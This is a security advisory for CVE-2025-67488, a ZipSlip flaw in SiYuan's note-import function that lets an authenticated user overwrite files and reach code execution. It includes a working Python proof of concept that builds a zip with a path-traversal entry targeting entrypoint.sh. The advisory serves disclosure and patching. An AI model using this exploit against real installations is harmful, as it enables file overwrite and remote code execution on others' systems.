# SiYuan: ZipSlip -> Arbitrary File Overwrite -> RCE

**GHSA**: GHSA-gqfv-g4v7-m366 | **CVE**: CVE-2025-67488 | **Severity**: high (CVSS 7.8)

**CWE**: CWE-22

**Affected Packages**:
- **github.com/siyuan-note/siyuan/kernel** (go): <= 0.0.0-20251202123337-6ef83b42c7ce

## Description

### Summary
Function [**importZipMd**](https://github.com/siyuan-note/siyuan/blob/dae6158860cc704e353454565c96e874278c6f47/kernel/api/import.go#L190) is vulnerable to **ZipSlip** which allows an authenticated user to overwrite files on the system.

### Details
An authenticated user with access to the import functionality in notes is able to overwrite any file on the system, the vulnerable function is  [**importZipMd**](https://github.com/siyuan-note/siyuan/blob/dae6158860cc704e353454565c96e874278c6f47/kernel/api/import.go#L190), this can escalate to full code execution under some circumstances, for example using the official **docker image** it is possible to overwrite **entrypoint.sh** and after a container restart it will execute the changed code causing remote code execution.

### PoC
Code used to generate the ZipSlip:
```python
#!/usr/bin/env python3
import sys, base64, zipfile, io, time

def prepare_zipslip(filename):
    orgfile1 = open('Test.md','rb').read()
    payload =  open('entrypoint.sh','rb').read() #b"testpayload"
    
    zipslip = io.BytesIO()
    with zipfile.ZipFile(zipslip, 'w', compression=zipfile.ZIP_DEFLATED) as zipf:        
        info = zipfile.ZipInfo('Test.md')
        mtime = time.time()
        t = time.localtime(mtime)
        info.date_time = (t.tm_year, t.tm_mon, t.tm_mday, t.tm_hour, t.tm_min, t.tm_sec)
        zipf.writestr(info, orgfile1)
        
        info = zipfile.ZipInfo(filename)
        mtime = time.time()
        t = time.localtime(mtime)
        info.date_time = (t.tm_year, t.tm_mon, t.tm_mday, t.tm_hour, t.tm_min, t.tm_sec)
        zipf.writestr(info, payload)
    return zipslip.getvalue()

gz = prepare_zipslip('../../../../../../../../../../opt/siyuan/entrypoint.sh')
open('exp.zip', 'wb').write(gz)
```

### Impact
The exploit is possible only if the attacker has access to **import** functionality. It's possible to achieve code execution and some persistence within the container
